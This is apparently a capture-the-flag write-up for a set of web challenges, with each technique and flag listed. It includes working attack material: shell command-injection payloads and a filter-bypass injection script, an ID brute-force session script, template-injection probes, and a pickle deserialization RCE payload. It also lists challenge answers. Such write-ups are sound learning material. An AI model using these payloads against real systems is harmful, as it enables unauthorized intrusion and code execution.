+++
title = "Web"
weight = 3
+++

## we01

https://ggcs-we01.allyourbases.co/

the blurb said that the flag was on some common directory and said to look for a list of common directories.  

I tossed a dirbuster at it and found a valid directory at https://ggcs-we01.allyourbases.co/sample/

the flag was at https://ggcs-we01.allyourbases.co/sample/flag.txt

flag: `bustING_direTORies_8918`

## we02

https://ggcs-we02.allyourbases.co/

the flag was hidden in one of the webpack js files - particularly https://ggcs-we02.allyourbases.co/component---src-pages-else-js-b41975d5a1f03391fee1.js

I saw it in the source code and noticed that it didn't get loaded.  After checking it out manually i found the flag.  

flag: `webPACkEd-AlRiGHT_7182`

## we03

https://ggcs-we03.allyourbases.co/

the blurb mentioned a secret page which made me think about robots.txt.  I checked it out and it had a disallow directive for https://ggcs-we03.allyourbases.co/61829201829023.html.  The flag was on that page. 

flag: `NO_CrAwLing_Plz_0192`

## we04

https://ggcs-we04.allyourbases.co/

There was some javascript making a request and passing the user agent.  I assumed that the purpose was to allow search engines to read it for SEO purposes.  I set my user agent to googlebot (`Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`) and it gave me the flag.  
flag: `CrawlING-So-SlOwLY-8199`

## wm01

https://ggcs-wm01.allyourbases.co/

basic shell command injection.  The flag could be read with `/root; cat .flag.txt`

flag: `unSAFE_eXecution_42`

## wm02

https://ggcs-wm02.allyourbases.co/index.html

I looked at the source and found that if you had a cookie name `login` with and id set but nothing else it would fill out the rest of the data.  I wrote a python script to incrementally try every number until 100.  The admin was id 33.  

```python
import requests
import json
url = "https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm02"
for i in range(100):
	r = requests.post(url, data = json.dumps({"id": i}))
	print(r.text)
```

flag: `IncREMentaLl_SessIoNs-1920`

## wm03

https://ggcs-wm03.allyourbases.co/

I tried a couple other user IDs with getUser but that didn't pan out.  I then tried to send a command to list users and it responsed with a list of commands
```json
        "commands": [
            "getUser",
            "setUser",
            "getFlag",
            "config"
        ]
```

I tried getFlag but it required an authentication token.  POSTing config responded with the token and then I was able to retrieve the flag. 

flag: `LAx_AUThEntiCaTION-:(`

## wh01

you can do command injection with `\n` and `\t` to bypass the blocked characters.  the flag is at /var/task/.../.flag.txt.  I hate this so much, i missed it the first time around and had to brute force every file on the system to find it.  

i used this script to make operation of it a little easier.  

```python
import json
import requests

url = "https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wh01"

while True:
	base_cmd = "/root\\n"
	cmd = base_cmd + input("> ")
	print(cmd)
	cmd = cmd.replace(" ","\\t")
	path = f"{{\"path\": \"{cmd}\"}}"
	print("path: ", path)
	# path = path.format()
	r = requests.post(url, data = path)
	print(r.json()['body'])
```

flag: `SCUffeD_FiLTERing_1000`

## wh02

I noticed that whenever displaying a 404 the page would show the path i failed to access.  I played around with it for a while trying out different injections until I noticed that `{{7 * 7}}` evaluated.  I then tried `{{/* locals() */}}` and received
```
It appears you got lost on the way to: /{'_Context__self': , 'dict': , 'lipsum': , 'cycler': , 'joiner': , 'namespace': , 'dir': , 'help': Type help() for interactive help, or help(object) for help about object., 'locals': , 'globals': , 'laksnd8quoqjknadaklsd9aodu892ja': 'Flag: tEmPlATes-R-FuNN-2391'} of None>, '_Context__obj': , 'args': (), 'kwargs': {}, '__traceback_hide__': True, 'fn': , 'fn_type': 'environmentfunction'}`
```

flag: `tEmPlATes-R-FuNN-2391`

## wh03

https://ggcs-wh03.allyourbases.co/

the website has a bunch of gross javascript and if it takes you more than 100 ms to skip the breakpoint it'll reload.  to bypass this I turned off javascript and then executed the relevant code manually.  I searched around the code until i saw something that looked like it printed the flag (the function u).  It required x to be equal to seq for it to print the flag so i cracked open the js console and set it manually, then called u().  


flag: `rANDom_VICTORy_113`


## wx01

https://ggcs-wx01.allyourbases.co/

python pickle deserialization exploit.  After noticing it was a pickle vuln from the stack trace i got when passing it a malformed data cookie, I wrote up a vuln to print the flag.  The flag was stored in a local variable so my exploit takes advantage of eval to execute code in the context of the server.  

```python
import pickle
import codecs
import base64
import os
class RCE:
    def __reduce__(self):
        return eval, ("{'name': flag}",)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE(), protocol=0)
    print(base64.urlsafe_b64encode(pickled))

```

flag: `suPER_SeRiAL-bR0_02891`